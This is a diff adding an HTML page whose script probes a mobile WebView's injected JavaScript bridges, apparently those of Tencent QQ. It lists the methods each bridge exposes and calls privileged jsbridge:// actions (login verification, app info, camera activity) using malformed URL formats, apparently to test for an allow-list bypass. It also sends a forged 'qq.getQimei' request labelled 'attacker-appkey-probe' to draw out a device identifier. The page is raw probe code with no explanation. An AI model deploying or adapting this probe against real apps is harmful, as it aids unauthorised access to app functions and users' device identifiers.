@@ -1,0 +1,51 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P5</title>
+<style>body{background:#fff;color:#000;font:14px monospace;word-break:break-all}</style></head>
+<body><div id="out">P5-START</div>
+<script>
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
+function w(t){document.getElementById('out').innerHTML += '<br>' + esc(t);}
+w('URL=' + location.href);
+window.JsBridge = { callback: function(id, res){ w('CB[' + id + ']=' + JSON.stringify(res)); } };
+window.qimeiCallback = function(h){ w('QIMEI_CB=' + h); };
+function inv(s){ try { _mqqWebViewJSInterface.invoke(s); w('INV ' + s); } catch(e){ w('INV_ERR:' + e.message); } }
+function enumObj(name){
+  try{
+    var o = window[name];
+    if (!o) { w(name + ':null'); return; }
+    var ms = [];
+    for (var m in o){ try { if (typeof o[m] === 'function') ms.push(m); } catch(e){} }
+    w('ENUM[' + name + ']:' + ms.join(','));
+    var ks = Object.keys(o);
+    if (ks.length && ks.join(',') !== ms.join(',')) w('KEYS[' + name + ']:' + ks.join(','));
+  }catch(e){ w('ENUM_ERR['+name+']:' + e.message); }
+}
+enumObj('tbsJs'); enumObj('tbs_bridge'); enumObj('WebSocket'); enumObj('qimeiBridge'); enumObj('_mqqWebViewJSInterface');
+setTimeout(function(){
+  w('--- default-table probes ---');
+  inv('jsbridge://InputClickEvent/onClickInputCtrl#2001');
+  inv('jsbridge://HtmlViewer/showHTML#2004');
+  inv('jsbridge://Troop/addGroupApp#2005');
+  inv('jsbridge://deviceapp/getAppInfo#2006');
+  w('--- hardcoded pre-allow ---');
+  inv('jsbridge://UrlSaveVerifyV2/validCheck#2002');
+  inv('jsbridge://identification/loginVerify#2007');
+  inv('jsbridge://faceUnblockCamera/startPTVActivity#2008');
+  w('--- normal deny baseline ---');
+  inv('jsbridge://device/getNetworkInfo#2003');
+  w('--- >5-segment format ---');
+  inv('jsbridge://device/getNetworkInfo/2010/x');
+  inv('jsbridge://InputClickEvent/onClickInputCtrl/2011/x');
+  w('--- tbs bridge calls ---');
+  try{ if (window.tbs_bridge){ var r1 = tbs_bridge.execHandler ? 'hasExecHandler' : 'noExecHandler'; w('tbs_bridge:' + r1); } }catch(e){ w('tbsbridge_err:' + e.message); }
+  setTimeout(function(){
+    w('--- qimei oracle ---');
+    try{
+      var t = Math.floor(Date.now()/1000);
+      var payload = JSON.stringify({handlerName:'qq.getQimei', appKey:'attacker-appkey-probe', time: t, token:'deadbeefdeadbeefdeadbeefdeadbeef'});
+      var r = qimeiBridge.postMessage(payload);
+      w('QM_SYNC=' + r);
+    }catch(e){ w('QM_ERR:' + e.message); }
+    setTimeout(function(){ w('DONE'); }, 5000);
+  }, 2500);
+}, 800);
+</script></body></html>
